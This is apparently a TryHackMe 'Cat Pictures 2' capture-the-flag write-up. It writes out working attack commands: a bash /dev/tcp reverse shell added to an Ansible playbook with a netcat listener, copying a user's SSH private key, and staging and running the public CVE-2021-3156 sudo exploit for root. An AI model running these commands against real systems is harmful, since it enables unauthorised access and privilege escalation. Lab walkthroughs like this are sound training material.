# Try Hack Me - Cat Pictures 2
# Author: Atharva Bordavekar
# Difficulty: Easy
# Points: 90
# Vulnerabilities: Hidden metadata in image, RCE via repository hijacking, SUDO version exploit (CVE-2021-3156)

# Phase 1 - Reconnaissance:
nmap scan:
```bash
nmap -p- --min-rate=1000 <target_ip>
```

PORT     STATE SERVICE

22/tcp   open  ssh

80/tcp   open  http

222/tcp  open  rsh-spx

1337/tcp open  waste

3000/tcp open  ppp

8080/tcp open  http-proxy

we will start enumerating the webpage at port 80. we see some pictures of cats. in the top right corner, there is a about icon which shows more details about the image we are viewing. lets use this to get some hidden details in the cat images. after some manual enumeration we find out that in the description of the cat image timo-volz there is a message which says "strip hidden metadata" maybe there is something hidden in this image. lets save this image on our system and run some metadata exfiltration commands on this image.
![timo-volz](https://github.com/realatharva15/cat_pictures_2_writeup/blob/main/images/Screenshot%202026-01-14%20at%2013-13-30%20Lychee%20-%20timo-volz.png)
```bash
exiftool timo-volz.jpg
```
we find some interesting information in the metadata of this image whcih leads us to a .txt file on the webpage running on the port 8080.
```
Title                           : :8080/764efa883dda1e11db47671c4a3bbd9e.txt
```
so lets visit the port 8080 and find out the contents of this .txt file. after visiting the port 8080 and navigating to the location of this file we find out that it is a note to oneself which says:

```
note to self:

I setup an internal gitea instance to start using IaC for this server. It's at a quite basic state, but I'm putting the password here because I will definitely forget.
This file isn't easy to find anyway unless you have the correct url...

gitea: port 3000
user: < REDACTED >
password: < REDACTED >

ansible runner (olivetin): port 1337

```
we have some credentials for the gitea instance. having no prior knowlegdge about gitea, i take help from DeepSeek to get more knowledge about gitea. after doing some studying, we found out that gitea is basically a lightweight version of github.

Gitea is a self-hosted, lightweight Git service (like GitHub or GitLab, but much simpler). It's essentially a web-based interface for Git repositories that allows you to:

    Host Git repositories (code storage with version control)

    Manage users and teams with access control

    Browse code through a web interface

    Handle issues, pull requests, and wikis

    Often used for Infrastructure as Code (IaC) - storing configuration files, playbooks (like Ansible), scripts, etc.

In CTF/penetration testing contexts, Gitea instances often contain:

    Credentials in code/config files

    Secrets in commit history

    Configuration files with passwords

    Deployment scripts that might reveal other services or vulnerabilities
we will visit this gitea webpage on the port 3000 and enter the credentials we found isnide the note

```bash
http://<target_ip>:3000
```
NOTE: once you login the gitea, the firefox browser will block browsing to the gitea main page wince the ip will change from the target ip to localhost. in order to fix that, just re-type the target ip address in the url in the place of localhost.

this i cannot show you the url directly but i will show you the images of the webpage where the domain is localhost and when the domain is the target ip address.
lets clone this repository to our attacker machine and then we will enumerate if from our machine offline. 
```bash
git clone <url_of_gitea_instance>
```
enter the username and the password when prompted. we will find out that there are 3 files, flag1.txt, playbook.yaml and README.md
 we find the flag1.txt here in the repository and submit it. inside the playbook.yml file we find a username which might be able t
o grant us access to the ssh shell. lets try using hydra to see if that user's ssh password can be bruteforced or not.

username:bismuth

now we will visit the OliveTin website on the port 1337 and find out a way to get a shell on the system. we find out that there are 4 buttons on the webiste which carry out 4 different tasks.

```bash
http://<target_ip>:1337
```
# Phase 2 - Initial Foothold:
the 2nd function is important to us as the hint for the 2nd flag is directed towards the Ansible playbook function. as we already had found the ansible repository on the port 3000. after reading the contents of the playbook.yaml file, and executing the ansible playbook task by clicking on the button, we find out that the function is capable of carrying out commands on the system. here it carries out the whoami command by default as mentioned in the playbook.yaml file. so we will simply edit the playbook.yaml file and append a reverse shell to it. just paste this block of code into the playbook.yaml file in the ansible repository and refresh the page

```bash
 - name: Reverse Shell
      shell: bash -c 'bash -i >& /dev/tcp/<target_ip>/4444 0>&1'
      async: 45
      poll: 0
      ignore_errors: yes
```

make sure you start a netcat listener in one of your terminals

```bash
nc -lnvp 4444
```
now inorder to trigger the reverse shell we will click on the Ansible playbook button which is the 2nd button on the webiste. and we will be granted a reverseshell as bismuth. since the shell is not a proper tty, we will copy the id_rsa of bismuth which is available at the /home/bismuth/.ssh/id_rsa path on the system

```bash
cat /home/bismuth/.ssh/id_rsa
```
save the contents inside a file named bismuth_id_rsa and give it the appropriate permissions.

```bash
chmod 600 bismuth_id_rsa
```
since the id_rsa does not have a passphrase we can directly access the ssh shell

```bash
ssh -i bismuth_id_rsa bismuth@<target_ip>
```
we have a better tty now. lets start enumerating the system. we will run the linpeas.sh script on the target system. the linpeas output didn't reveal anything useful except the fact that there is a 95% attack vector in the path,the problem was that there was no cronjob or process running as sudo on the system. so that turned out to be useless. after a few hours of manual enumeration i decided to go with the CVEs listed in the linpeas output. the sudo version was vulnerable to a common exploit (CVE-2021-3156). the link to the exploit is given in the linpeas output. so we will clone the github repository on our attacker machine and then transfer it to the targer machine as direct downloading from the target machine is not allowed

# Phase 3 - Privilege Escalation:
```bash
#in your browser just paste this
 https://codeload.github.com/blasty/CVE-2021-3156/zip/main
```
a .zip file will get downloaded on your system which you will have to unzip mannually

```bash
unzip CVE-2021-3156-main.zip
```
now we will navigate to the directory where the files are stored and then setup a python listener which will transfer the exploits to the target machine

```bash
#first navigate to the repository directory
cd ~/Downloads/CVE-2021-3156-main
```
now we setup the python listener
```bash
#on your attacker machine
python3 -m http.server 8000
```
we will transfer only the required files to the system which are going to be the hax.c, the lib.c and the Makefile

```bash
#on your target machine

#transfering hax.c
wget http://<attacker_ip>:8000/hax.c
```
```bash
#transferring lib.c
wget http://<attacker_ip>:8000/lib.c
```
```bash
#transferring Makefile
wget http://<attacker_ip>:8000/Makefile
```
so once we have all the required files on our target system, we will compile both the .c files using one command
```bash
make
```
this will create a sudo-hax-me-a-sandwich binary which will exploit the system. we still hace to give it the appropriate permissions

```bash
chmod +x sudo-hax-me-a-sandwich
```
now we will execute it directly and see what options need to be provided to the script.
```bash
./sudo-hax-me-a-sandwich
```
we recieve an output which gives us 3 choices to choose in order to get a root shell. the 3 choices are: 

```bash
** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

  manual mode:
    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
```
since the linpeas output revealed the exact ubuntu version (Ubuntu 18.04.6 LTS) we will use the 1st option i.e 0

```bash
./sudo-hax-me-a-sandwich 0
```
we have a root shell and have successfully exploited the vulnerable sudo version on this machine. we read the flag3.txt and submit it

```bash
cat /root/flag3.txt
```
                  
